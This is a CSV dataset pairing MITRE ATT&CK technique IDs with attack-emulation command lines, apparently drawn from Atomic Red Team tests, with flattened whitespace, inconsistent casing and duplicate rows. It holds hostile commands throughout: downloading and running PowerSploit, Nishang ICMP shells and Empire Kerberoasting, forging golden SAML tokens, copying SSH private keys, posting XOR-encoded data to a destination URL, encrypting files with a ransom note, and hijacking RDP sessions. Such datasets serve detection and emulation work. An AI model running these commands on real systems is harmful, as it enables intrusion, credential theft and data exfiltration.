mitre_id,command
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml""  "
T1491,"$url = ""#{url_of_wallpaper}"" $imglocation = ""#{wallpaper_location}"" $orgwallpaper = (get-itemproperty -path registry::'hkey_current_user\control panel\desktop\' -name wallpaper).wallpaper $orgwallpaper | out-file -filepath ""#{pointer_to_orginal_wallpaper}"" $updatewallpapercode = @' using system.runtime.interopservices; namespace win32{ public class wallpaper{ [dllimport(""user32.dll"", charset=charset.auto)] static extern int systemparametersinfo (int uaction , int uparam , string lpvparam , int fuwinini) ; public static void setwallpaper(string thepath){ systemparametersinfo(20,0,thepath,3); } } } '@ $wc = new-object system.net.webclient try{ $wc.downloadfile($url, $imglocation) add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } catch [system.net.webexception]{ write-host(""cannot download $url"") add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } finally{ $wc.dispose() } # id_8078"
T1613,docker build -t t1613 $pathtoatomicsfolder/t1613/src/ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613) 
T1553,"sudo security add-trusted-cert -d -r trustroot -k ""/library/keychains/system.keychain"" ""#{cert_filename}"""
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
T1486,"ECHO ""#{PWD_FOR_ENCRYPTED_FILE}"" | $WHICH_GPG --BATCH --YES --PASSPHRASE-FD 0 --CIPHER-ALGO #{ENCRYPTION_ALG} -O #{ENCRYPTED_FILE_PATH} -C #{INPUT_FILE_PATH}"
T1140,"encoded=$(echo '#{message}' | base64) printf $encoded | base64 -d echo $encoded | base64 -d echo $(echo $encoded) | base64 -d echo $encoded > #{encoded_file} && base64 -d #{encoded_file} echo $encoded > #{encoded_file} && base64 -d < #{encoded_file} echo $encoded > #{encoded_file} && cat #{encoded_file} | base64 -d echo $encoded > #{encoded_file} && cat < #{encoded_file} | base64 -d bash -c ""{echo,\""$(echo $encoded)\""}|{base64,-d}"""
T1572,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-domain-length.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} # id_8354"
T1201,net accounts
T1056,"prompt_command='history -a >(tee -a ~/.bash_history |logger -t ""$user[$$] $ssh_connection "")' echo ""\$prompt_command=$prompt_command"" tail /var/log/syslog"
T1486,"""""%programfiles%\dcrypt""\#{dcrypt_exe}"""
T1113,screencapture #{output_file}
T1113,screencapture -x #{output_file}
T1574,"set dotnet_startup_hooks=""#{preloader_dll}"" dotnet -h > nul echo.  "
T1652,"find /lib/modules/$(uname -r)/kernel/drivers -name ""*.ko*""  "
T1651,"IMPORT-MODULE ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1/AWSSSMATTACK.PS1"" -FORCE $ACCESS_KEY = ""#{ACCESS_KEY}"" $SECRET_KEY = ""#{SECRET_KEY}"" $SESSION_TOKEN = ""#{SESSION_TOKEN}"" $AWS_PROFILE = ""#{PROFILE}"" $REGION = ""#{REGION}"" SET-AWSAUTHENTICATION -ACCESSKEY $ACCESS_KEY -SECRETKEY $SECRET_KEY -SESSIONTOKEN $SESSION_TOKEN -AWSPROFILE $AWS_PROFILE -AWSREGION $REGION INVOKE-TERRAFORM -TERRAFORMCOMMAND INIT -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" INVOKE-TERRAFORM -TERRAFORMCOMMAND APPLY -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" -TERRAFORMVARIABLES @(""PROFILE=T1651-1"", ""REGION=$REGION"") INVOKE-SSMATTACK -AWSPROFILE ""T1651-1"" -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" INVOKE-TERRAFORM -TERRAFORMCOMMAND DESTROY -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" -TERRAFORMVARIABLES @(""PROFILE=T1651-1"", ""REGION=$REGION"")"
T1074,"invoke-webrequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.bat"" -outfile #{output_file} # id_8481"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1560,"WHICH_PYTHON=`WHICH PYTHON || WHICH PYTHON3` $WHICH_PYTHON -C ""IMPORT TARFILE; OUTPUT_FILE = TARFILE.OPEN('#{PATH_TO_OUTPUT_FILE}','W'); OUTPUT_FILE.ADD('#{PATH_TO_INPUT_FILE}'); OUTPUT_FILE.CLOSE()"""
T1001,"cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh "
T1006,"$BUFFER = NEW-OBJECT BYTE[] 11 $HANDLE = NEW-OBJECT IO.FILESTREAM ""\\.\#{VOLUME}"", 'OPEN', 'READ', 'READWRITE' $HANDLE.READ($BUFFER, 0, $BUFFER.LENGTH) $HANDLE.CLOSE() FORMAT-HEX -INPUTOBJECT $BUFFER"
T1047,"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall # id_4176"
T1115,apt install xclip -y history | tail -n 30 | xclip -sel clip xclip -o > history.txt # id_4401
T1059,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1059.005\src\t1059_005-macrocode.txt"" -officeproduct ""word"" -sub ""extract""   "
T1098,"$x = get-random -minimum 2 -maximum 99 $y = get-random -minimum 2 -maximum 99 $z = get-random -minimum 2 -maximum 99 $w = get-random -minimum 2 -maximum 99 import-module activedirectory $account = ""#{account_prefix}-$x$y$z"" new-aduser -name $account -givenname ""test"" -displayname $account -samaccountname $account -surname $account -enabled:$false #{create_args} add-adgroupmember ""#{group}"" $account"
T1132,echo -n 111-11-1111 | b64encode -r - curl -xpost #{base64_data}.#{destination_url} # id_9115
T1219,"invoke-webrequest -outfile c:\users\$env:username\downloads\gotoassist.exe ""https://launch.getgo.com/launcher2/helper?token=e0-facddxmtmox8_cy4czssntegvy83ihp8clrefvwqshibw0_rcbdoaep8ia-qn8wpbklpgifls-39gw6ruwrm-xhwtkrvmlbsp5rskp-a3pbm-pb1fliy73edgoaxr-q83wtxblkqd7-u3cfdl9gksymmhdktgsxcdxir90nqkj92lsn_kpyywv06lixsdrekhnzjnwhkwrba_hg8rqjqwsgk6tkzlvmumufmn37ec2cqqiwq5bcgnh5dyisuusklsedrljh4n46qpyt1bau0qd25zpr-kvf4kzu9bt02q3yntj02za99txl2-skzgryizoopbpg4ilfo5t78uxktyeewo4etqecfkcrvenktrlihmowdbd88zz7niccxnbhjzehgs6_-jsvjqidptxzbf9t5z44mi4bqymtzas3de86f0c3d4tcd7fa5f6ve8rqwt7pvqfcyyijaailslxow0lsgyfokoy65tmf980rep8zhvctkyp8s8mhgxihuqjqpnk20sw&downloadtrigger=restart&renamefile=1"" $file1 = ""c:\users\"" + $env:username + ""\downloads\gotoassist.exe"" start-process $file1 /s; # id_9852"
T1580,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance  "
T1112,set-executionpolicy -executionpolicy bypass -scope localmachine
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""#{client_id}"" $client_secret = ""#{client_secret}"" $tenant_id = ""#{tenant_id}"" $environment = ""#{cloud}"" set-azureauthentication -clientid $client_id -clientsecret $client_secret -tenantid $tenant_id -environment $environment get-azurediscoverydata -outputdirectory ""#{output_directory}"" -environment $environment remove-blankfiles -outputdirectory ""#{output_directory}"""
T1553,"$cert = import-certificate -filepath #{pfx_path} -certstorelocation cert:\localmachine\my move-item -path $cert.pspath -destination ""cert:\localmachine\root"" "
T1053,"crontab -l > /tmp/notevil echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron} # id_6960"
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1221,"START ""#{DOCX_FILE}"""
T1530,"$storage_account_objects = import-csv -path ""#{storage_account_objects_csv_file_path}"" # login to azure az login if (-not (test-path -path ""#{output_folder}"")) { new-item -itemtype directory -path ""#{output_folder}"" } foreach ($row in $storage_account_objects) { if ($row.filesharename -ne """"){ $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching content from file share: $($row.filesharename) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for file share content $filesharepath = join-path -path $storageaccountoutputpath $row.filesharename if (-not (test-path -path $filesharepath)) { new-item -itemtype directory -path $filesharepath } az storage file download-batch --connection-string $connectionstring --source $row.filesharename --destination $filesharepath } } elseif ($row.containername -ne """" -and $row.blobname -eq """") { $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching all blobs from container $($row.containername) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for blob content $containerfolderpath = join-path $storageaccountoutputpath $row.containername if (-not (test-path -path $containerfolderpath)) { new-item -itemtype directory -path $containerfolderpath } az storage blob download-batch --destination $containerfolderpath --source $row.containername --connection-string $connectionstring } } }"
T1091,"$REMOVABLEDRIVES=@() $REMOVABLEDRIVES = GET-WMIOBJECT -CLASS WIN32_LOGICALDISK -FILTER ""DRIVETYPE=2"" | SELECT-OBJECT -EXPANDPROPERTY DEVICEID FOREACH ($DRIVE IN $REMOVABLEDRIVES) { WRITE-HOST ""REMOVABLE DRIVE FOUND:"" $DRIVE NEW-ITEM -PATH $DRIVE/T1091TEST1.TXT -ITEMTYPE ""FILE"" -FORCE -VALUE ""T1091 TEST 1 HAS CREATED THIS FILE TO SIMULATE MALWARE SPREAD TO REMOVABLE DRIVES."" }"
T1558,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex(iwr https://raw.githubusercontent.com/empireproject/empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/invoke-kerberoast.ps1 -usebasicparsing) invoke-kerberoast | fl # id_7334
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""#{plaintext}"")) $key = ""#{key}"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.length]; } $cyphertext = [system.text.encoding]::utf8.getstring($cyphertext) [system.net.servicepointmanager]::expect100continue = $false invoke-webrequest -uri #{destination_url} -method post -body $cyphertext -disablekeepalive"
T1552,mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \; exit 0 # id_6159
T1566,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1566.001/bin/phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm
T1531,sysadminctl -deleteuser #{user_account} #enter admin password
T1033,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); invoke-userhunter -stealth -verbose
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/shells/invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress #{server_ip}
T1489,taskkill.exe /f /im #{process_name} # id_6076
T1046,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') spoolvulnscan -noninteractive -consoleoutput   
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack # id_5499"
T1124,date
T1007,LAUNCHCTL LIST
T1572,"for($i=0; $i -le #{query_volume}; $i++) { (invoke-webrequest ""#{doh_server}?name=#{subdomain}.$(get-random -minimum 1 -maximum 999999).#{domain}&type=#{query_type}"" -usebasicparsing).content }"
T1486,echo t1486 - purelocker ransom note > %userprofile%\desktop\your_files.txt 
T1505,%windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path}
T1137,reg.exe add hkcu\software\microsoft\office\#{outlook_version}\outlook\webview\#{outlook_folder} /v url /t reg_sz /d #{url} /f
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}""  "
T1021,sudo /system/library/coreservices/remotemanagement/ardagent.app/contents/resources/kickstart -activate -configure -allowaccessfor -allusers -privs -all -quiet
T1005,"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" }"
T1056,"ps2=`logger -t ""$user"" -f ~/.sh_history` $ps2 tail /var/log/messages"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1123,REG ADD HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\CAPABILITYACCESSMANAGER\CONSENTSTORE\MICROPHONE\NONPACKAGED\C:#WINDOWS#TEMP#ATOMIC.EXE /V LASTUSEDTIMESTART /T REG_BINARY /D A273B6F07104D601 /F REG ADD HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\CAPABILITYACCESSMANAGER\CONSENTSTORE\MICROPHONE\NONPACKAGED\C:#WINDOWS#TEMP#ATOMIC.EXE /V LASTUSEDTIMESTOP /T REG_BINARY /D 96EF514B7204D601 /F
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
